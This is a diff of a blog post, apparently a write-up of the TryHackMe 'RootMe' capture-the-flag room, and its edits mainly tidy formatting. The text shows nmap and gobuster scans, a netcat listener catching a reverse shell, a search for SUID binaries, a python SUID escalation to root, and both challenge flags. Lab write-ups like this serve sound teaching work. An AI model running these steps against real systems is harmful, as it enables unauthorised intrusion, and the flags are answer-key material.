@@ -116,11 +116,11 @@ Now do the nmap scan.&lt;/p&gt;
 &lt;p&gt;Run nmap scan to search which ports are open and much more. First create the nmap folder and Run the following command.&lt;br&gt;
 command:&lt;code&gt;mkdir nmap&lt;/code&gt;&lt;br&gt;
 command:&lt;code&gt;cd nmap&lt;/code&gt;&lt;br&gt;
-command:&lt;code&gt;nmap -sV -oN nmap/rootme 10.10.156.27&lt;/code&gt;\&lt;/p&gt;
+command:&lt;code&gt;nmap -sV -oN nmap/rootme 10.10.156.27&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;command breakdown:&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;-sV : Version Detection&lt;/li&gt;
-&lt;li&gt;-oN : store the output into nmap folder&lt;/li&gt;
+&lt;li&gt;-sV : Version Detection.&lt;/li&gt;
+&lt;li&gt;-oN : store the output into nmap folder.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.94 scan initiated Wed Sep 27 23:49:49 2023 as: nmap -sV -oN nmap/rootm\
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;e 10.10.156.27
@@ -157,7 +157,7 @@ command:&lt;code&gt;nmap -sV -oN nmap/rootme 10.10.156.27&lt;/code&gt;\&lt;/p&gt
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;h1 id=&#34;finding-hidden-directories&#34;&gt;Finding hidden directories&lt;/h1&gt;
-&lt;p&gt;So there may be some hidden directories, we are going to use gobuster tool for that. Run the following command.
+&lt;p&gt;So there may be some hidden directories, we are going to use gobuster tool for that. Run the following command.&lt;br&gt;
 command:&lt;code&gt;gobuster dir -u http://10.10.156.27/ -w /home//sumit/ctf/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;┌──&lt;/span&gt;(sumit&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;㉿&lt;/span&gt;mr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;nob0dy)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;~/&lt;/span&gt;ctf&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;tryhackme]
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;└─$&lt;/span&gt; gobuster dir &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;u http:&lt;span style=&#34;color:#75715e&#34;&gt;//10.10.156.27/ -w /home//sumit/ctf/directory-list-2.3-medium.txt
@@ -230,7 +230,7 @@ command:&lt;code&gt;nc -lvnp 4444&lt;/code&gt;&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sh: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; can&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t access tty; job control turned off
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We get the shell access, now gothrough the all files and folders. try to find user.txt run the following command.&lt;br&gt;
-command:&lt;code&gt;find -type f -name user.txt&lt;/code&gt;\&lt;/p&gt;
+command:&lt;code&gt;find -type f -name user.txt&lt;/code&gt;&lt;/p&gt;
 
 &lt;img src=&#34;../flag1.png&#34;  alt=&#34;home page&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
 
@@ -238,14 +238,14 @@ command:&lt;code&gt;find -type f -name user.txt&lt;/code&gt;\&lt;/p&gt;
 &lt;p&gt;Run:&lt;br&gt;
 command:&lt;code&gt;cd var/www&lt;/code&gt;&lt;br&gt;
 command:&lt;code&gt;ls&lt;/code&gt;&lt;br&gt;
-command:&lt;code&gt;cat user.txt&lt;/code&gt;\&lt;/p&gt;
-&lt;p&gt;We got our first flag:
-&lt;code&gt;THM{y0u_g0t_a_sh3ll}&lt;/code&gt;&lt;/p&gt;
+command:&lt;code&gt;cat user.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We got our first flag.&lt;br&gt;
+Flag:&lt;code&gt;THM{y0u_g0t_a_sh3ll}&lt;/code&gt;&lt;/p&gt;
 &lt;h1 id=&#34;-task-4-privilege-escalation&#34;&gt;# Task 4 Privilege escalation&lt;/h1&gt;
 &lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
 &lt;p&gt;Now that we have a shell, let&amp;rsquo;s escalate our privileges to root.&lt;br&gt;
 From hint run the following command to search a file with SUID permission and we got the file with the name python.&lt;br&gt;
-command:&lt;code&gt;find / -user root -perm /4000&lt;/code&gt;\&lt;/p&gt;
+command:&lt;code&gt;find / -user root -perm /4000&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;We have a shell but it is not stable. From hint do some research on GTFOBins, Google it. Search for python in gtfobins go the SUID section we got the command.&lt;/p&gt;
 
 &lt;img src=&#34;../gtfobin.png&#34;  alt=&#34;home page&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
@@ -254,7 +254,7 @@ command:&lt;code&gt;find / -user root -perm /4000&lt;/code&gt;\&lt;/p&gt;
 &lt;p&gt;command:&lt;code&gt;python -c &#39;import os; os.execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-p&amp;quot;)&#39;&lt;/code&gt;&lt;br&gt;
 command:&lt;code&gt;cd root&lt;/code&gt;&lt;br&gt;
 command:&lt;code&gt;ls&lt;/code&gt;&lt;br&gt;
-command:&lt;code&gt;cat root.txt&lt;/code&gt;\&lt;/p&gt;
+command:&lt;code&gt;cat root.txt&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;By running the above command we get the root access or a stable shell now try to access &lt;code&gt;root.txt&lt;/code&gt; file.
 we got our 2nd flag&amp;hellip;.
 flag:&lt;code&gt;THM{pr1v1l3g3_3sc4l4t10n}&lt;/code&gt;&lt;/p&gt;
@@ -262,14 +262,14 @@ flag:&lt;code&gt;THM{pr1v1l3g3_3sc4l4t10n}&lt;/code&gt;&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;
 &lt;p&gt;Search for files with SUID permission, which file is weird?&lt;br&gt;
-&lt;code&gt;ans: /usr/bin/python&lt;/code&gt;\&lt;/p&gt;
+&lt;code&gt;ans: /usr/bin/python&lt;/code&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Find a form to escalate your privileges.&lt;br&gt;
 &lt;code&gt;ans: no answer needed&lt;/code&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;root.txt
+&lt;p&gt;root.txt&lt;br&gt;
 &lt;code&gt;ans: THM{pr1v1l3g3_3sc4l4t10n}&lt;/code&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
